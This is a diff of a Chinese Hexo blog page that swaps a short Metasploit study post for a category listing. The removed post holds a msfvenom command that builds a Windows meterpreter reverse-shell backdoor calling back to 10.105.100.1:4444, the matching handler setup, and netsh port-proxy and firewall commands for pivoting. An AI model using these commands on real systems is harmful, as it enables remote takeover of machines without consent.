@@ -47,18 +47,17 @@
 </script>
 
 
-  <meta name="description" content="一些乱七八糟的东西">
+  <meta name="description" content="Hello world">
 <meta name="keywords" content="Test">
-<meta property="og:type" content="article">
-<meta property="og:title" content="MSF日常学习">
-<meta property="og:url" content="https:&#x2F;&#x2F;mocus.gitee.io&#x2F;2019&#x2F;msfdailystudy&#x2F;index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Mox的笔记库">
+<meta property="og:url" content="https:&#x2F;&#x2F;mocus.gitee.io&#x2F;categories&#x2F;%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0&#x2F;index.html">
 <meta property="og:site_name" content="Mox的笔记库">
-<meta property="og:description" content="一些乱七八糟的东西">
+<meta property="og:description" content="Hello world">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-12-30T23:14:51.000Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://mocus.gitee.io/2019/msfdailystudy/">
+<link rel="canonical" href="https://mocus.gitee.io/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/">
 
 
 <script id="page-configurations">
@@ -66,12 +65,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome: false,
-    isPost: true,
+    isPost: false,
     isPage: false,
     isArchive: false
   };
 </script>
-  <title>MSF日常学习 | Mox的笔记库</title>
+  <title>分类: 日常学习 | Mox的笔记库</title>
   
 
 
@@ -191,150 +190,54 @@
           <div class="content">
             
 
-  <div class="posts-expand">
-      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mocus.gitee.io/2019/msfdailystudy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="MocusEZ">
-      <meta itemprop="description" content="Hello world">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Mox的笔记库">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          MSF日常学习
+  
+  <div class="post-block">
+    <div class="posts-collapse">
+      <div class="collection-title">
+        <h1 class="collection-header">日常学习
+          <small>分类</small>
         </h1>
-
-        <div class="post-meta">
-
-
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-12-15 07:14:51" itemprop="dateCreated datePublished" datetime="2019-12-15T07:14:51+08:00">2019-12-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-31 07:14:51" itemprop="dateModified" datetime="2019-12-31T07:14:51+08:00">2019-12-31</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/dailystudy/" itemprop="url" rel="index">
-                    <span itemprop="name">日常笔记</span>
-                  </a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2019/msfdailystudy/#comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/msfdailystudy/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+      </div>
 
       
-        <p>一些乱七八糟的东西</p>
-<a id="more"></a>
-<h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>使用msfvenom</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.105.100.1  LPORT&#x3D;4444 -f exe &gt; winc.exe</span></pre></td></tr></table></figure>
-
-<p>开启监听</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">run</span></pre></td></tr></table></figure>
-
-<h2 id="Windows网络代理"><a href="#Windows网络代理" class="headerlink" title="Windows网络代理"></a>Windows网络代理</h2><p>netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport </p>
-<p>netsh advfirewall firewall add rule name=”pdd” protocol=TCP dir=in localip=10.105.105.3  localport=2001 action=allow </p>
-<p>netsh interface portproxy reset </p>
-<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><p>MSf详解</p>
-<p> <a href="https://www.freebuf.com/news/210292.html" target="_blank" rel="noopener">https://www.freebuf.com/news/210292.html</a> </p>
-<p>Windows代理</p>
-<p><a href="https://www.freebuf.com/articles/system/176889.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/176889.html</a></p>
-
+    <div class="collection-year">
+      <h1 class="collection-header">2020</h1>
     </div>
 
-    
-    
-    
-        
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
 
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>MocusEZ
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="/https:/mocus.gitee.io/2019/msfdailystudy/" title="MSF日常学习">https://mocus.gitee.io/2019/msfdailystudy/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc/4.0/zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
+      <div class="post-meta">
+        <time itemprop="dateCreated"
+              datetime="2020-01-21T16:14:27+08:00"
+              content="2020-01-21">
+          01-21
+        </time>
+      </div>
 
+      <h2 class="post-title">
+          <a class="post-title-link" href="/2020/androidgnupg/" itemprop="url">
+            <span itemprop="name">在Android(Termux)上使用GnuPG</span>
+          </a>
+      </h2>
 
-      <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2019/setinfo/" rel="prev" title="Hexo部署安装全流程回顾">
-      <i class="fa fa-chevron-left"></i> Hexo部署安装全流程回顾
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2019/breakbanpai/" rel="next" title="如何以正确方式给门娃Gatebaby班牌安装常用软件">
-      如何以正确方式给门娃Gatebaby班牌安装常用软件 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
+    </header>
   </article>
+
+    </div>
+  </div>
   
   
   
 
-  </div>
+  
+
 
 
           </div>
           
-    <div class="comments" id="comments"></div>
 
         </div>
           
@@ -359,7 +262,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#生成后门"><span class="nav-number">1.</span> <span class="nav-text">生成后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows网络代理"><span class="nav-number">2.</span> <span class="nav-text">Windows网络代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#资料"><span class="nav-number">3.</span> <span class="nav-text">资料</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
